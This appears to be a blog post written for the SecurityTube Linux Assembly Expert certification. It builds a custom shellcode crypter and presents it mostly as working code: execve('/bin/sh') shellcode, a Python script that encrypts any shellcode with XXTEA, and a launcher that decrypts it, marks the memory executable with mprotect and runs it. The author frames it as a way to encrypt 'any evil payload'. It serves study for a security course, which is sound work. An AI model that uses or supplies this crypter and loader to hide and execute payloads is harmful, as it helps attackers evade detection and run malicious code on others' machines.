---
layout: post
author: thesp0nge
title: "Assignment #7: Create a custom crypter"
tags: [slae, shellcode, crypter, python, launcher, shellcode, tea, xxtea, block cipher, assembler, i386]
comments: true
category: [slae]
share: true
order: 6
---


The seventh and last assignment is to create a custom crypter like the one
shown in the "crypters" video. I'm free to use any existing encryption schema
and I can use any programming language.

The assignment was written on an Ubuntu Linux 18.04, with a Linux kernel 4.15
version.

## Choosing the encryption scheme

For this last assignment I want to use something quick and reliable to encrypt
any evil payload. I started looking at
[TEA](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm) for its
characteristics and implementations.

I choose to use [XXTEA](https://en.wikipedia.org/wiki/XXTEA) that it is an
evolution of original algorithm to correct all weaknesses found.

This is a symmetric block cipher and the key must be 16 bytes long.

## Environment

I will use python as programming language and the
[xxtea](https://pypi.org/project/xxtea) package that it is available with the
following command:

> pip install xxtea

## Encrypt

The default behaviour is to select a 16 bytes long random key and use xxtea library facilities to encrypt the default shellcode that is the standard execve() shellcode used in assignment 4.

{% highlight asm %}

; Filename: 	execve.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the default payload for the customer encoder demo. It
; 		will execute "/bin/sh" using execve() system call.

global _start			

section .text

_start:
	xor eax, eax		; init EAX to 0
	push eax		; pushing 0 to the stack to be used as NULL
				; ending character for /bin/sh string
	
	; execve is defined as #define __NR_execve 11 in 
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is: 
        ; int execve(const char *filename, char *const argv[], 
	; 		char *const envp[]);

	push 0x68732f2f		; pushing //bin/sh into the stack
	push 0x6e69622f		; the init double / is for alignment purpose

	mov ebx, esp		; pointer to *filename

	; I will optimize further my execve-stack shellcode. Since I don't care
	; about passing parameters to my shell and to pass the environment
	; pointer, I can initialize to zero both ECX and EDX registers.
	;
	; This will be equivalent to the call: execve("/bin/sh", 0, 0) that it
	; is legit.
	xor ecx, ecx
	xor edx, edx

	mov al, 0xb		; execve = 11
	int 0x80

{% endhighlight %}

However, the crypter tool accepts also a custom encryption key and a custom
shellcode to be used instead of the default one.

{% asciicast 198703 %}

Here you can find the source code for the crypter script:

{% highlight python %}

#!/usr/bin/env python

import random, string, getopt, xxtea, sys

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-k, --key: specify the encryption key"
    print "\t-s, --shellcode: specify the shellcode to be used"

    return 0

def generate_key():
    k=''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16));
    return k;

def encrypt(shellcode, key):
    enc = xxtea.encrypt(shellcode, key);
    return enc;

def main(argv):
    # Default behaviour is to generate a random key and to use an
    # execve("/bin/sh") shellcode
    key = generate_key();
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

    try:
        opts, args=getopt.getopt(argv, "hk:s:", ["help", "key", "shellcode"] )
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=arg
            if (len(key) != 16):
                print "The encryption key must be 16 byte long"
                help()
                sys.exit(-2)
        elif opt in ('-s', '--shellcode'):
            shellcode=arg.replace('\\x', '').decode('hex')

    print "key: " + key;
    enc = encrypt(shellcode, key)
    sys.stdout.write("encrypted shellcode: \\x");
    sys.stdout.flush();
    print '\\x'.join(map("%2.2x".__mod__, map(ord, enc)));

if __name__ == "__main__":
    main(sys.argv[1:])


{% endhighlight %}

## Decrypt and launch

The launcher script is responsible for decrypting a given payload using a given
decryption key. It may be redundant to recall but, since XXTEA is a Symmetric
Cryptography algorithm, the decryption key is the one used to crypt the
shellcode.

{% highlight python %}

#!/usr/bin/env python
# Got rid of SEGFAULT using the solution provider here:
# https://stackoverflow.com/questions/19326409/python-ctype-segmentation-fault

import random, string
import xxtea
import sys, time
import getopt
import fileinput
from ctypes import *

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-k, --key: specify the decryption key"
    print "\t-e, --encrypted-shellcode: specify the encrypted payload"

    return 0

def decrypt(enc, key):
    return xxtea.decrypt(enc, key)

def main(argv):

    key = ""
    enc = ""

    try:
        opts, args=getopt.getopt(argv, "hk:e:", ["help", "key", "encrypted-shellcode"] )
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=arg
        elif opt in ('-e', '--encrypted-shellcode'):
            enc = arg


    if not key:
        print "Please specify a decryption key using the -k flag";
        help();
        sys.exit(-2);

    if not enc:
        print "Please specify a payload to decrypt using the -e flag";
        help();
        sys.exit(-3);



    enc_b= enc.replace('\\x', '').decode('hex')

    shellcode_data=decrypt(enc_b, key);
    sys.stdout.write("decrypted shellcode: \\x")
    sys.stdout.flush()
    print '\\x'.join(map("%2.2x".__mod__, map(ord, shellcode_data)))

    print "launching the shellcode..."


    shellcode=create_string_buffer(shellcode_data)
    function  = cast(shellcode, CFUNCTYPE(None))

    addr = cast(function, c_void_p).value
    libc = CDLL('libc.so.6')
    pagesize = libc.getpagesize()
    addr_page = (addr // pagesize) * pagesize

    for page_start in range(addr_page, addr+len(shellcode_data), pagesize):
        assert libc.mprotect(page_start, pagesize, 0x7) == 0
    function()
    
if __name__ == "__main__":
    main(sys.argv[1:])
{% endhighlight %}

Launching the shellcode is **really** hard stuff. I've to fight against tons of
SEGFAULTS and this post saved me in getting rid of non executable bit
protection for memory regions:
[https://stackoverflow.com/questions/19326409/python-ctype-segmentation-fault](https://stackoverflow.com/questions/19326409/python-ctype-segmentation-fault).

See it in action:

{% asciicast 198715 %}

## SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1217

